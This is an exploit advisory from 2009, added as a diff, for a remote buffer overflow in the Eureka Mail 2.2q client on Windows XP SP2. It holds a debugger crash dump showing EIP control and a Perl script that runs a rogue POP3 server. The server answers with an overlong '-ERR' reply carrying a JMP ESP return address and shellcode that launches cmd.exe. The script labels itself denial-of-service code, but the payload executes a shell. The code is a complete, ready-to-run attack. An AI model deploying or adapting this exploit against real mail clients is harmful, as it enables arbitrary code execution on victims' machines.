@@ -1,0 +1,101 @@
+#####################################################################################
+
+Application:  Eureka Mail client
+            
+Platforms:    Windows XP Professional SP2
+
+Exploitation: remote BoF
+
+Date:         2009-10-06
+
+Author:       Francis Provencher (Protek Research Lab's) 
+
+Special Thanks to:  M Jeremy Brown 	
+             
+
+#####################################################################################
+
+1) Introduction
+2) Technical details
+3) The Code
+
+
+#####################################################################################
+
+===============
+1) Introduction
+===============
+Sick of junk email? Bored of all email programs looking the same? Take a look at Eureka Email and see how different things could be...
+Eureka Email has a built in junk email filter which can remove about 95% of your spam and it continually learns as it comes across new junk emails. You can customise the program so each of your friends has their own icon and sound for when they send you an email. You can also set up special accounts for your children so that they never get to see sexually explicit or offensive junk emails.  
+
+(from Eureka Mail website)
+#####################################################################################
+
+============================
+2) Technical details 
+============================
+
+Eureka Mail 2.2q 
+
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=0054007a ecx=7c92005d edx=00230000 esi=00475bf8 edi=00473678
+eip=41414141 esp=0012cd6c ebp=00475bfc iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00010202
+
+
+
+#####################################################################################
+
+===========
+3) The Code
+===========
+
+Proof of concept DoS code;
+
+
+#!/usr/bin/perl
+
+use IO::Socket;
+
+$ret  = 0x7C867877;             # Jump ESP Kernel32.dll 0x7C867877
+
+$port = 110;
+
+
+# Simple cmd.exe
+
+$sc2 =  "\xB8\xFF\xEF\xFF\xFF\xF7\xD0\x2B\xE0\x55\x8B\xEC" .
+        "\x33\xFF\x57\x83\xEC\x04\xC6\x45\xF8\x63\xC6\x45" .
+        "\xF9\x6D\xC6\x45\xFA\x64\xC6\x45\xFB\x2E\xC6\x45" .
+        "\xFC\x65\xC6\x45\xFD\x78\xC6\x45\xFE\x65\x8D\x45" .
+        "\xF8\x50\xBB\xC7\x93\xBF\x77\xFF\xD3";
+
+
+$serv = IO::Socket::INET->new(Proto=>'tcp',
+                              LocalPort=>$port,
+                              Listen=>1)
+or die "Error: listen($port)\n";
+
+$cli = $serv->accept() or die "Error: accept()\n";
+
+$retaddr = pack('l', $ret);
+$junk    = "A" x 709;
+
+
+$payload = "-ERR " . $junk . $retaddr  . "\x90" x 1 . $sc2 .  "\r\n"; # 714 to overwrite EIP
+
+     $cli->send($payload);
+
+     close($cli);
+     close($serv);
+
+
+
+#####################################################################################
+(PRL-2009-11)
+
+
+      __________________________________________________________________
+Yahoo! Canada Toolbar: Search from anywhere on the web, and bookmark your favourite sites. Download it now
+http://ca.toolbar.yahoo.com.
